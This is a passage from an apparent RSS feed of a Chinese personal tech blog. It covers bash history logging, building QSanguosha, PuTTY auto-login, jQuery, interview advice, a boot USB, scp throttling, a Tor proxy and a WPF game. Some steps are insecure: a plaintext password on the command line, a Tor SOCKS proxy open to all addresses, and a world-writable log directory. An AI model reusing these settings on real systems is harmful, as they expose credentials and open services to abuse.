&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></p>  <p><span lang="EN-US"   style=""   sans-serif=""   colorfd=""   >export HISTTIMEFORMAT='%F %T '&nbsp; </span></p>  <p><span lang="EN-US"   style=""   sans-serif=""   colorfd=""   >mkdir -p /home/work/.history/</span></p>  <p><span lang="EN-US"   style=""   sans-serif=""   colorfd=""   >chown work:work /home/work/.history/ &amp;&gt;/dev/null</span></p>  <p><span lang="EN-US"   style=""   sans-serif=""   colorfd=""   >chmod -R a+w /home/work/.history/ &amp;&gt;/dev/null</span></p>  <p><span lang="EN-US"   style=""   sans-serif=""   colorfd=""   >export HISTORY_FILE=/home/work/.history/`date '+%Y%m'`.log&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></p>  <p><span lang="EN-US"   style=""   sans-serif=""   colorfd=""   >export PROMPT_COMMAND='history -a; { echo $(ls -l `tty` |awk "{print \$3}" ) $(whoami) $(history 1 | { read x cmd;echo "$cmd" ;});} &gt;&gt; $HISTORY_FILE'</span></p><wbr>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>默认分类</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372013015102128710/</guid>
    </item>
    <item>
      <title>
<![CDATA[从博客访问来源看搜索引擎]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372010102023434375/</link>
      <description>
<![CDATA[一个毫无系统的博客，访问来源主要是搜索引擎，每天细看访问来源，也是一件有意思的事。<br>很久很久以前，主要访问来源是谷歌，其次是百度，大概是4:1的比例吧，<br>后来谷歌走了，主要访问来源是百度，大概90%吧，不到10%的访问来自谷歌<br>后来又有些新的来源，偶尔出来下，比如soso, bing, ucweb，不过好像没见过youdao，难道youdao不抓网易博客？<br><br>来自搜索引擎的访问，主要原因就是关键词了，看下这个访问来源都是用什么关键词来到本博客的：<br>百度访问量最多，访问来源使用的关键词几乎什么都有，很难分析出特点来。<br>谷歌访问来源就很清楚了，基本上都是这几个关键词：ubuntu 三国杀 Pearson 相关系数 Myeclipse axis graphviz opengl ngx_xxx，很容易就能看出特点了：英文单词！谷歌很强大，不过中文搜索实在不给力啊。<br>Bing 的访问更少了，好像几个都是 Bing 的图片搜索，关键词是“红蓝3D”，Bing 的图片搜索比较强大？也许吧，来自Bing 的样本太少了。<br>soso 和 ucweb 的访问量也非常少，不过soso的博客搜索，搜索关键字"邮箱"，20小时前发的博客"<a href="http://hankjin.blog.163.com/blog/static/337319372010101945126230" target="_blank">腾讯企业邮箱</a>"竟然排名第二，实时性还是比较赞的。<br><br>和自己架博客相比，使用博客服务的缺点就出来了，可定制性太底，很多日志数据实在没办法得到，处理也不方便。以上全部是无聊时手工分析出来的。]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Articles</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372010102023434375/</guid>
    </item>
    <item>
      <title>
<![CDATA[Ubuntu10.04编译太阳神三国杀]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720111261019231/</link>
      <description>
<![CDATA[１。下载源代码<br>wget https://download.github.com/Moligaloo-QSanguosha-526d876.tar.gz<br>tar xf Moligaloo-QSanguosha-526d876.tar.gz<br><br>２。安装相关库<br>２。１irrKlang库<br>wget http://www.ambiera.at/downloads/irrKlang-1.3.0b.zip<br>unzip irrKlang-1.3.0b.zip<br>sudo cp irrKlang-1.3.0/bin/linux-gcc/*.so /usr/local/lib<br>２。２lua库<br> sudo apt-get install liblua5.1-dev<br> sudo ln -s /usr/lib/liblua5.1.so /usr/lib/liblua.so<br>２。３plib库<br>预备工作<br>sudo apt-get install freeglut3-dev libglut3-dev<br>sudo apt-get install libxmu-dev libxmu6 <br>sudo ln -s /usr/lib/libXi.so.6 /usr/lib/libXi.so<br>安装库<br>wget http://cdnetworks-kr-1.dl.sourceforge.net/project/plib/plib/1.8.5-rc1/plib-1.8.5-rc1.tar.gz<br>tar xf plib-1.8.5-rc1.tar.gz<br>cd plib-1.8.5-rc1<br>./configure<br>make<br>sudo make install<br>cd ..<br><br>３。编译<br>sudo apt-get install qt4-dev-tools qtcreator swig<br>sudo apt-get install liblua5.1-sql-sqlite3-dev<br>cd Moligaloo-QSanguosha-526d876<br>cd swig<br>swig -c++ -lua sanguosha.i<br>cd ..<br>qmake<br>make<br>会出现下面的错误，只要找到代码处注释掉该行即可，因为Ubuntu10.04的Qt是4.6的，没有setPlaceholderText。<br> src/roomscene.cpp:172: error: ‘class QLineEdit’ has no member named ‘setPlaceholderText’<br> src/server.cpp:274: error: ‘class QLineEdit’ has no member named ‘setPlaceholderText’<br> ./ui_connectiondialog.h:158: error: ‘class QLineEdit’ has no member named ‘setPlaceholderText’<br> ./ui_configdialog.h:394: error: ‘class QLineEdit’ has no member named ‘setPlaceholderText’<br> ./ui_configdialog.h:396: error: ‘class QLineEdit’ has no member named ‘setPlaceholderText’<br> ./ui_configdialog.h:398: error: ‘class QLineEdit’ has no member named ‘setPlaceholderText’<br> ./ui_configdialog.h:400: error: ‘class QLineEdit’ has no member named ‘setPlaceholderText’<br>编译完成后<br>./QSanguosha<br><br>４。中文<br>  打开Applications-&gt;Programming-&gt;Qt 4 Linguist<br>  用Linguist打开sanguosha.ts，然后在Linguist中File-&gt;Release<br>  然后再启动QSanguosha就是中文的了]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>默认分类</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720111261019231/</guid>
    </item>
    <item>
      <title>
<![CDATA[putty自动登录]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937201011424503/</link>
      <description>
<![CDATA[最烦的就是重复，每天用putty登录，Linux密码最初是8位，后来变为6位，后来变为3位。<br>没有最懒，只有更懒，putty可以自动登录的。使用puttygen可以无需输入帐户和密码登录<br>1. 下载puttygen.exe<br>http://the.earth.li/~sgtatham/putty/latest/x86/puttygen.exe<br>2. 使用puttygen产生公钥和私钥<br>公钥保存到服务器的在~/.ssh/authorized_keys中<br>私钥保存在本地<br>3. 设置putty.exe<br>在Connection-&gt;Da<wbr>ta中设置用户名<br>在Connection-&gt;SSH-&gt;Auth中设置公钥文件<br>4. 保存session, 下次双击就可自动登录<br><br>第二种方法<br>putty.exe -pw &lt;password&gt; -P &lt;port&gt; &lt;user&gt;@&lt;ip&gt;<br>例如：<br>putty.exe -pw mysecret -P 22 usera@ubuntu.unix-center.net<div>putty.exe -load config1<br><br></div>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937201011424503/</guid>
    </item>
    <item>
      <title>
<![CDATA[使用jQuery通过select控制显示的内容]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200931224219806/</link>
      <description>
<![CDATA[选中配件时显示&lt;div id="parts"&gt;, 选中步骤时显示&lt;div id="step"&gt;, 代码如下:<br><br>选择 : &lt;html:select property="type"&gt;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &lt;html:option value="S"&gt;步骤&lt;/html:option&gt;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &lt;html:option value="P"&gt;配件&lt;/html:option&gt;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/html:select&gt;<br>&lt;div id="parts"&gt;Name:&lt;input type="text"/&gt;&lt;/div&gt;<br>&lt;div id="step"&gt;Welcome&lt;/div&gt;<br>&lt;script language="javscript"&gt;<br>$(document).ready(function(){<br>&nbsp;&nbsp;&nbsp; $("#parts").hide();//默认是步骤<br>&nbsp;&nbsp;&nbsp; $("select[@name=type]").change(function(){<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; $("#parts").hide();<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; $("#step").hide();<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; switch($(this).val()){<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; case 'P':<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; $("#parts").show();<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; break;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; default:<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; $("#step").show();<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; });<br>});<br>&lt;/script&gt;<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Web Skills</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200931224219806/</guid>
    </item>
    <item>
      <title>
<![CDATA[一个HR给应届毕业生的面试建议 后悔看到的太晚了(z)]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200814101417937/</link>
      <description>
<![CDATA[应届生在参加面试时如何有技巧的回答一系列的问题。<BR><BR>　　开始之前务必记住：<BR><BR>　　黄金法则：<FONT color=#ff0000>80/20---你要承担起80%的谈话而面试官只会说20%。<BR></FONT><BR>　　白金法则：<FONT color=#ff0000>你必须试着控制面试的节奏和话题。<BR></FONT><BR>　　钻石法则：<FONT color=#ff0000>对于没有把握的问题，抛回给面试官。<BR></FONT><BR>　　1．在一分钟内介绍一下你自己<BR><BR>　　这似乎是必答题。不要以为这很容易。如果你用一分钟来重复你的简历，恭喜你，你的印象加分没有了！建议你最多用二十秒钟介绍自己的姓名、学校、专业。然后话锋一转，引出自己的优势或强项。一定要在最短时间内激发起面试官对你的好感，或者至少是兴趣。<BR><BR>　　成功的模式可以是：我叫XXX，英文名字XXX，XX省XX市人，今年6月将从XX学校XX专业本科（专科）毕业。除了简历上您看到的介绍，我愿意特别说一下我在XXX方面的特长/我最大的特点是……（给出事例）。正是基于对自己这方面的自信，使我有勇气来应聘贵公司的XXX这一职位。（看表）一分钟到了，希望我没有超时。（很阳光的微笑）<BR><BR>　　如果面试官不是EQ太低，你的最后一句话应该会使他放松和微笑。资历嫩一点的还会接着问：“为什么你会这么认为呢？”如果他真的这么问你，Bingo!你完全有机会操纵这次面试！<BR><BR>　　2．应届生经常会被问到的一个问题是：你为什么会选择你目前学习的专业呢？千万当心，这个问题的目的是考察你的DecisionQuality这一项胜任力，所以不要简单的说“感兴趣”或者“就业前景乐观”等。给大家一个成功的范例（同样适用于诸如‘您所做过的一个成功/最大的决定是什么”）：<BR><BR>　　问：张先生，您为什么会选择财务专业呢？<BR><BR>　　答：的确，财务已经连续多年成为高校热门专业，这造成了就业时无可避免的激烈竞争。可当初我选择财务专业时并不是单纯因为它的热门程度。我早就把就业目标锁定在苏州工业园区的外资企业。根据我高三时搜集到的统计资料，园区当时有外企XXX家，而且每年以XXX%的速度在增加。以每个公司财务部至少5个人计算（总账，应收应付，税务，出纳再加上一个经理），加上园区的平均离职率是15%，则在我毕业时，可以有XXX个空缺。我毕业那年应该全国有XX相关专业的毕业生。其中可能有10%会瞄准苏州，而我填报的苏州大学在当地口碑尚可，属于中等偏上。那么，有1/2的对手能被我淘汰。再加上我就在苏州本地学习，四年中可以更早的寻求机会，所以，我很有信心的选择了这个专业。<BR><BR>　　其实，没有哪个面试官会相信你真的作过如此缜密的调查分析，但你已经展示了你做决策时的思路，所以可以加分。<BR><BR>　　记住：所有的回答要符合你专业的特点。不要说得太到位，可以自圆其说就行了，不然，他们会觉得你要么太虚伪，要么太狂妄。还有，应该表示对自己的专业的确感兴趣，或者增加点戏剧效果：我本来理解的财务管理就是管账，所以开始的时候还真后悔了一阵，直到大三时开始了在企业的实践，才有了改观，并真正喜欢上了我的专业。这样显得真实可信，更重要的是，很自然的由你引导到准备好的问题：实习的收获。<BR><BR>　　3．为了考察您LearningontheFly这一条胜任力，通常我们会问您在实习期间的收获。此时，不要夸大自己的成绩，谦虚一点。还有，不妨说一下自己的失误（不用怕，毕竟你是在实习）。记住：详细说明当时的情况（Situation），你要达到的目的（Task），你采取了哪些步骤（Actions），事情的结果（Result），还有你得到的经验教训(Lessonlearned)以及后来怎样运用到工作中避免犯类似的错误。最后做出总结：原来书本上的知识要能够在工作中熟练运用，这期间还有很长的一段路要走。还可以说：回到学校后，我对自己的实习经历作了一番总结，发现自己在XXX方面还需要加强。所以，我很注意利用大学的最后一个学期来弥补这一不足。现在，我对自己很有信心，如果时间能够倒流，我相信我能做到更好。<BR><BR>　　4．你有过和别人合作的经历吗？（千万要回答“有”）那么，在这过程中，你是如何处理意见分歧的呢？现在是考察你的ConflictsManagement。现在的绝大部分企业都不欣赏没有原则的老好人。所以，你要把自己包装得强势一些。<BR><BR>　　我本人比较满意的回答：<BR><BR>　　每个人在团队中都应该可以自由坦诚地发表意见，我会非常认真的聆听，分析；但对于自己的意见我不会没有原则的轻易放弃。民主过后还需要集中。我是学校英语俱乐部的主席，在组织校际年度联欢时，有两个干事的意见和我不一致。（停顿一下，让面试官记住你的这个闪光点）我和他们开了会。大家都阐述了各自的理由。很遗憾，我仍然没有说服这两人。在这种情况下，我感谢他们的积极参与，但表示仍然会采用我的方案。我的理念是：Meeting不等于Voting，完全不需要少数服从多数；我是负责人，我相信自己有能力采取最佳方案；假如失败了，我也会承担主要责任。而如果我是团队的普通一员，我会保留自己的意见，但还是认真执行管理者已经做出的决策。当然，学校毕竟不同于公司，情况会更加复杂，但我坚信，只要遵循“对事不对人”的原则，任何问题都可以得到解决。<BR><BR>　　在回答时，一定要眼睛看着面试官，微笑，以冲淡你的咄咄逼人。<BR><BR>　　如果你实在没有把握，可以把问题抛还给面试官，试举一例（还是同样的问题）：<BR><BR>　　问：你是如何处理意见分歧的呢？<BR><BR>　　答：您问的恰好也是我最困惑的一点，而学校里老师从来不给我们这样的指点。一方面，我不想做没有原则的老好人，另一方面，大家都是朝夕相处的同学，我不想让他们觉得我盛气凌人。我当时是这样做的：……可一直到现在，我都不知道是否作的正确，也许我可以从您那里得到一些指教，您说我当时这么做有问题吗？<BR><BR>　　如果对方马上对你言传身教，那他铁定是菜鸟，你不用紧张了，因为，合理的反应应该是不置可否的说：其实这个问题永远不会有标准答案。<BR><BR>　　5．有人问起多个问题同时出现时，应该如何解决。这就是PrioritySetting的胜任力。应对思路是把所有要处理的事情按轻重缓急分成4个象限：重要而且紧急；重要但不紧急；不重要但紧急；不重要也不紧急。但记住，不要直接叙述这个思路，这会让人觉得你不像应届生。还是通过举例说明比较好。我面试过的一个比较好的例子：我在大三时正好要复习准备英语6级考试，这时有机会可以去一家企业做兼职部门助理，但需要每周花三个半天。同时，每月一次的英语沙龙活动要组织安排，还要(不好意思地说)抽空陪陪女朋友（最后一点很重要，可以活跃气氛，还为下面制造了一个不重要不紧急的事例）。我当时利用没有课程的下午去公司工作，一般要到5点半回学校。在公车上的30分钟正好用来总结当天在公司的收获和需要了解的知识。在食堂与女朋友吃晚饭，六点半去教室自习，到十点回宿舍。英语沙龙的工作委派给大二的两个干事，他们每天会到自习教室找我谈10分钟，我会给他们一些建议。这样，我没有花太多的精力在沙龙活动上，可对整个过程都有了解和掌控。后来6级考试顺利通过，那家公司对我的工作评价很高，我也学了很多东西；英语沙龙的活动如期举行，我和女朋友也没有疏远。<BR><BR>　　这同时展示了三条胜任力：prioritysetting；delegation和work/lifebalance<BR><BR>　　作为应届生，在面试前，应该了解一下外企的部门架构。以欧美企业为例，一般部门内的职位从低到高依次为：助理（如果是本科生，有时候可以跳过）---专员---资深专员---主管---资深主管---部门副经理/SectionManager---部门经理。一般，主管要求有5年以上的相关工作经验，这是一个分水岭。好，回过来谈谈面试时如何回答关于职业生涯规划问题。其实,这种问题并不需要你回答得无懈可击,这也办不到---你说得通俗了,认为你胸无大志;回答太专业了,又觉得你好高鹜远.<BR><BR>　　回答这类问题，有以下几点可以帮你加分：<BR><BR>　　1．设定一个与自己专业相关的长远目标；这个目标要和公司的工作有关但不要局限在企业内部（因为空间有限，会遭遇许多太过于细节的问题）。例如，HR专业的学生可以说，自己的目标是在35岁之前，也就是10年内，成为一名优秀的人才测评专家或者资深企业人力资源顾问；工程技术专业的学生，可以成为精益生产专家或者黑带大师；IT专业则可以在信息资源整合和ERP解决方案方面成为专家，等等。注意，要着重在你想做些什么，而不是你想爬到什么级别。<BR><BR>　　2．把这个目标分解，以1年，3年，5年，10年的进度，逐步推进。这个就要靠你自己编了，恕在下不能一一举例。记住，每个阶段都要说明你能为公司做出怎样的贡献，你能得到怎样的提高，这与你长远目标的关系在哪里。此时，可以适当联系到刚刚提到的部门架构。<BR><BR>　　3．在此过程中，除了自己想办法不断充电，还要说一下你希望公司可以给你怎样的帮助。比如能够有岗位轮换的机会；或者能够参与各种项目等。不要提希望公司会给你培训，送你出国，给你报销学费，要表现得自己希望在实践中成长。<BR><BR>　　4．强调自己的稳定的心态。你可以这样说：“中国人最讲究‘名正言顺’或者‘不在其位，不谋其职’，所以很多人都认为，只有给了主管的职位，才能运用主管的权利，发挥主管的作用。我的理念和别人不同，我认为恰恰相反，当你展示出了主管该具有的能力，能完成更多的工作，公司自然会考虑对你的职位进行调整。在没有足够的权力时，要使用自己的影响力，所以我鄙视那些成天想着晋升却没有任何建树的人。”这样子，你的自我包装就成功了一大半。<BR><BR>　　5．最后要注意，在回答类似问题时，不要显得太胸有成竹。偶尔显示出涉世未深可以让面试官觉得你还有学生的单纯。“这个问题很大，我在学校里也曾经断断续续的考虑过，现在我简单的讲一下，可能会显得一厢情愿，希望得到您的指教”这样的一个缓冲在许多时候很管用哦。（还记得钻石法则吗？）<BR><BR>　　最后想提一下面试的肢体语言。我面试过的应届生应该没有1000也有800了吧。我发现几乎90%的人在入座后都采用一种非常闭合的姿势，很拘谨。这不能说是坏事，但的确会让面试开始的破冰显得艰难。现在，闭上眼睛，想象一对亲密情侣在烛光下甜蜜交谈，他们的姿势应该是几乎一样的；你们平时和好朋友促膝长谈，相信采用的也是相同的姿势；电视上的国家元首交谈时，绝大多数情况两人的姿势也相同或接近。这是因为：两个人如果在交谈过程中采用同一种姿势，则双方在潜意识中会有彼此认同的感觉。我们把这样的姿势一致称为Rapport。我本人非常注重采用Rapport来增进沟通效果（特别是，如果有人盛气凌人的叉腰对我说话，不论他的职位高低，我也会叉腰和他说话---输人不输阵：））<BR><BR>　　还有，面试时，手势的运用很重要。特别是回答较大的问题时，用手虚拟的在桌面上列出1，2，3，这样会让人觉得你很有条理，而且不会显得很稚嫩。而说到我会怎样怎样时，把手掌放在心口，真的有强化的效果。<BR><BR>　　一句话：面试时，要表现的有教养，容易 ]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Mood</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200814101417937/</guid>
    </item>
    <item>
      <title>
<![CDATA[两步制作N合一启动U盘:DOS+WinPE+CDLinux+Windows&amp;Ubuntu安装盘]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200932093721350/</link>
      <description>
<![CDATA[<a target="_blank" href="http://img.bimg.126.net/photo/6RPU439KrOb4shwhcc0b0Q==/3109735542699863696.jpg"  ><img title="两步制作N合一启动U盘:DOS+WinPE+CDLinux+WindowsUbuntu安装盘 - hankjin - 乱-Blog"  alt="两步制作N合一启动U盘:DOS+WinPE+CDLinux+WindowsUbuntu安装盘 - hankjin - 乱-Blog"  style="width: 523px; height: 391px;"  src="http://img.bimg.126.net/photo/6RPU439KrOb4shwhcc0b0Q==/3109735542699863696.jpg"  ></a><br>两步安装<br>1. 从<a target="_blank" rel="nofollow" href="http://dl.getdropbox.com/u/194885/Udisk.rar"  >这里</a>下载压缩包, 解压缩到U盘根目录下<br>3. 运行setup/grubinst_gui.exe, 如下图所示<br><a target="_blank" href="http://img.bimg.126.net/photo/Em7hCyWYFRYg2ZUJ5ynEvA==/3417106217267928217.jpg"  ><img title="两步制作N合一启动U盘:DOS+WinPE+CDLinux+WindowsUbuntu安装盘 - hankjin - 乱-Blog"  alt="两步制作N合一启动U盘:DOS+WinPE+CDLinux+WindowsUbuntu安装盘 - hankjin - 乱-Blog"  src="http://img.bimg.126.net/photo/Em7hCyWYFRYg2ZUJ5ynEvA==/3417106217267928217.jpg"  ></a><br>点击Install, 安装完成!!!!!!<br>现在可以启动到DOS, WinPE(电脑狂人版), CDLinux(0.9.2), Ghost(11.0.2)<br>只要从网上下载ubuntu-8.04-server-i386.iso, 放到setup目录下,就可以作为Ubuntu的安装盘<br>只要从网上下载CDlinux-0.9.2.iso, 放到setup目录下,就可以作为CDLinux的光盘启动<br>只要从网上下载winxp_en.iso, 放到setup目录下,就可以作为英文版Windows的安装盘<br>注: 要做Windows和Ubuntu的安装盘, 需要1G以上内存.<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>OS</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200932093721350/</guid>
    </item>
    <item>
      <title>
<![CDATA[scp的限速功能(流量控制)]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720118894730445/</link>
      <description>
<![CDATA[scp 的 -l 参数可以控制传输速度,如 scp -l 5000 hankjin@localhost:/tmp/10G .<br><br><wbr>scp 的限速用两个函数实现<br>bandwidth_limit_init()<br>bandwidth_limit()<br>第一个函数设置传输速度的阈值<br>第二个函数限制传输速度<br>循环写完1s内需要的流量数之后, 计算耗费的时间和需要的时间差, 然后动态调整下1s的流量.<br>这样带来两个问题:<br>1. 第1s内的速度较低,导致第2s的速度飙高.<br>2. 流量不平滑, 例如10M/s的速度, 实际在前0.1s内完成,然后剩下0.9s空闲.<br>在正常应用下, 这两个问题都不是问题, 也满足多数限速要求.<br>但是在某些条件下, 这两个问题显得scp的速度控制不够精细.<br><br>1. 如果要保证其它服务的稳定性, 这时流量控制就要保证时刻都不高于指定速度.<br>2. 如果流量不平滑, 也可能影响服务, 前0.1s和服务抢带宽, 后0.9s带宽空闲. 对实时性要求不高的应用没有问题, 但是在要求精度小于0.1s的服务, 这个问题也需要解决.<br><br>满足这两个条件的流量控制伪码如下:<br>total=0, total_time=0, last_time=0<br>WHILE TRUE:<br>&nbsp; read nbyte<br>&nbsp; total_time+=now-last_time&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #计算消耗的时间<br>&nbsp; last_time=now&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>&nbsp; total+=n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #计算传输的数据量<br>&nbsp; IF total/rate &gt; total_time:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #如果传输太快, 控制一下<br>&nbsp;&nbsp;&nbsp; sleep(total/rate - total_time)<br>&nbsp; FI<br>&nbsp; if total &gt; rate:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #1s为粒度控制, 避免前1s的低导致后1s的飙高<br>&nbsp;&nbsp;&nbsp;&nbsp; total=0, total_time=0]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Network</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720118894730445/</guid>
    </item>
    <item>
      <title>
<![CDATA[使用tor+FoxyProxy翻墙]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720095257311057/</link>
      <description>
<![CDATA[首先安装Tor<br>sudo apt-get install tor<br>sudo vi /etc/tor/torrc<br>SocksListenAddress 202.114.0.242:8118 # Proxy服务的IP和端口<br>SocksPolicy accept 0.0.0.0/0 #可以使用该Proxy的客户端<br>sudo /etc/init.d/tor start<br>然后安装Fireforx的FoxyProxy插件<br>https://addons.mozilla.org/zh-CN/firefox/addon/2464<br>然后点右下角的图标<br>Add New Proxy<br>打开Proxy Details 选项卡，输入上面的IP和端口<br>打开URL Patterns 选项卡，输入要使用该代理的网站，如http://www.manning.com/*<br>然后右击FoxyProxy图标，选择要使用的代理方式<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720095257311057/</guid>
    </item>
    <item>
      <title>
<![CDATA[WPF小程序：贪吃蛇]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372009535108234/</link>
      <description>
<![CDATA[一共两个文件：EasterEgg.xaml + EasterEgg.xaml.cs<br><a href="http://img.bimg.126.net/photo/3HVDfU_KelOvirKSJZStRw==/5694520253833674535.jpg" target="_blank"><img title="WPF小程序：贪吃蛇 - hankjin - 乱-Blog" alt="WPF小程序：贪吃蛇 - hankjin - 乱-Blog" src="http://img.bimg.126.net/photo/3HVDfU_KelOvirKSJZStRw==/5694520253833674535.jpg"></a><br>EasterEgg.xaml<br>&lt;Window x:Class="Inspect.UI.EasterEgg"<br>&nbsp;&nbsp;&nbsp; xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"<br>&nbsp;&nbsp;&nbsp; xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"<br>&nbsp;&nbsp;&nbsp; Title="Easter Egg" Loaded="Window_Loaded" Width="650" Height="450"<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; KeyDown="Window_KeyDown" SizeChanged="Window_SizeChanged"<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; WindowStartupLocation="CenterScreen"&gt;<br>&nbsp;&nbsp;&nbsp; &lt;Grid&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;Grid.RowDefinitions&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;RowDefinition Height="40"/&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;RowDefinition/&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/Grid.RowDefinitions&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;StackPanel Grid.Row="0" Orientation="Horizontal"&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;Label FontSize="20"&gt;等级:&lt;/Label&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;Label FontSize="20" Name="lblGrade" Width="50" Content="{Binding Path=Grade}"&gt;&lt;/Label&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;Label FontSize="20"&gt;分数:&lt;/Label&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;Label FontSize="20" Name="lblScore" Width="90" Content="{Binding Path=Score}"&gt;&lt;/Label&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;Label FontSize="20"&gt;说明: 上下左右键调整方向，空格键暂停&lt;/Label&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/StackPanel&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;Border Grid.Row="1" BorderThickness="5" 